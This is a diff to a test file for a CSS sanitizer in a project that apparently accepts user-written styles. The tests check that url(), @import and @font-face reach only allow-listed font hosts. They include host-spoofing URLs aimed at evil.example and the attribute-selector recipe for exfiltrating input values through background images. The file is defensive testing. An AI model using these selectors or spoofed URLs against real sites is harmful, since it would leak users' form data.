@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { CSS_SCOPE, MAX_CSS_LENGTH, sanitizeCss } from "../src/css/sanitize.ts";
+import { CSS_SCOPE, CSS_URL_HOSTS, MAX_CSS_LENGTH, sanitizeCss } from "../src/css/sanitize.ts";
 
 /**
  * Custom CSS is the feature the decision log said not to switch on casually.
@@ -52,41 +52,103 @@ describe("nothing escapes the content area", () => {
   });
 });
 
-describe("no stylesheet makes a network request", () => {
+describe("a stylesheet reaches allow-listed hosts and nowhere else", () => {
   /**
-   * `url()` is how CSS exfiltrates. An attribute selector plus a background
-   * image leaks what it matched, one request per guess — and even benign use
-   * hands every visitor's IP to whoever hosts the asset.
+   * `url()` is how CSS exfiltrates: an attribute selector plus a background
+   * image reports what it matched, one request per guess. Host allow-listing is
+   * what makes it safe to permit at all — the technique still works, but the
+   * request can only arrive somewhere the author cannot read.
+   *
+   * Every case below is a way of looking like an allowed host without being
+   * one, which is where host checks usually fail.
    */
-  test("url() is refused in every form", () => {
-    for (const value of [
-      "background-color: url(https://evil.example/x)",
-      "background-color: URL('//evil.example/x')",
-      "background-color: url\t(//evil.example/x)",
-      "border-image: image-set('//evil.example/x')",
+  test("a URL on any other host is refused", () => {
+    for (const url of [
+      "https://evil.example/x",
+      // Suffix, not the host.
+      "https://fonts.googleapis.com.evil.example/x",
+      // Userinfo, not the host — the browser reads this as evil.example.
+      "https://fonts.googleapis.com@evil.example/x",
+      // Protocol-relative: whose host this is depends on the page.
+      "//fonts.gstatic.com/x",
+      // Right host, wrong scheme.
+      "http://m.doughmination.gay/x",
+      "data:text/css,x",
     ]) {
-      const out = compile(`.a { ${value} }`);
-      expect(out.kept, value).toBe(0);
+      const out = compile(`.a { background-image: url(${url}) }`);
+      expect(out.kept, url).toBe(0);
+      expect(out.issues[0]?.kind, url).toBe("url_not_allowed");
     }
   });
 
-  test("@import is refused", () => {
-    const out = compile("@import url('//evil.example/x.css'); .a { color: #fff }");
-    expect(out.css).not.toContain("import");
-    expect(out.issues.some((i) => i.kind === "at_rule_not_allowed" || i.kind === "unparsable")).toBe(true);
+  test("the allow-listed hosts work", () => {
+    for (const host of CSS_URL_HOSTS) {
+      const out = compile(`.a { background-image: url(https://${host}/x.png) }`);
+      expect(out.kept, host).toBe(1);
+    }
   });
 
-  test("@font-face cannot be used to fetch a font", () => {
-    const out = compile("@font-face { font-family: x; src: url(//evil.example/f.woff) } ");
+  test("a URL hidden in a shorthand is checked too", () => {
+    const out = compile(".a { background: #000 url(https://evil.example/x) no-repeat }");
     expect(out.kept).toBe(0);
-    expect(out.issues[0]?.kind).toBe("at_rule_not_allowed");
   });
 
-  // Attribute-selector exfiltration needs a request to carry the secret. With
-  // url() gone the selector is harmless, but the pairing is the classic recipe
-  // and is worth naming in a test.
-  test("an attribute selector cannot be paired with a request", () => {
-    const out = compile(`input[value^="a"] { background-color: url(//evil.example/a) }`);
+  test("legacy resource loaders stay refused", () => {
+    expect(compile(".a { background-image: image-set('https://evil.example/x') }").kept).toBe(0);
+  });
+
+  /**
+   * `@import` is the one thing pkviewer serves without compiling, so it is
+   * locked to the single host that exists to return font stylesheets — not to
+   * the whole allow-list, since the CDN serves arbitrary files and importing
+   * one would smuggle in rules that never met the compiler.
+   */
+  test("@import works for Google Fonts and nothing else", () => {
+    expect(compile(`@import url("https://fonts.googleapis.com/css2?family=Inter");`).kept).toBe(1);
+    for (const url of [
+      "https://m.doughmination.gay/x.css",
+      "https://fonts.gstatic.com/x.css",
+      "https://evil.example/x.css",
+    ]) {
+      const out = compile(`@import url("${url}");`);
+      expect(out.kept, url).toBe(0);
+      expect(out.issues[0]?.kind, url).toBe("url_not_allowed");
+    }
+  });
+
+  // A statement at-rule ends at a semicolon. Reading ahead to the next brace
+  // instead would swallow the rule after it.
+  test("a refused @import does not consume the rule after it", () => {
+    const out = compile(`@import url("https://evil.example/x.css");\n.a { color: #fff }`);
+    expect(out.css).toContain("color: #fff");
+    expect(out.css).not.toContain("evil.example");
+  });
+
+  test("@font-face loads from allow-listed hosts only", () => {
+    const good = compile(
+      `@font-face { font-family: X; src: url(https://fonts.gstatic.com/s/x.woff2) format("woff2") }`,
+    );
+    expect(good.kept).toBe(2);
+    expect(good.css).toContain("@font-face");
+
+    // A face whose src was refused has nothing to load, so the whole block goes
+    // rather than naming a family it cannot supply.
+    const bad = compile("@font-face { font-family: X; src: url(https://evil.example/x.woff2) }");
+    expect(bad.css).toBe("");
+  });
+
+  test("@font-face takes descriptors, not arbitrary properties", () => {
+    const out = compile(
+      "@font-face { font-family: X; src: url(https://fonts.gstatic.com/x.woff2); position: fixed; color: red }",
+    );
+    expect(out.css).not.toContain("position");
+    expect(out.css).not.toContain("color");
+    expect(out.issues.filter((i) => i.kind === "property_not_allowed")).toHaveLength(2);
+  });
+
+  // The classic recipe. The selector is still expressible; the request is not.
+  test("attribute-selector exfiltration has nowhere to send anything", () => {
+    const out = compile(`input[value^="a"] { background-image: url(https://evil.example/a) }`);
     expect(out.kept).toBe(0);
   });
 });
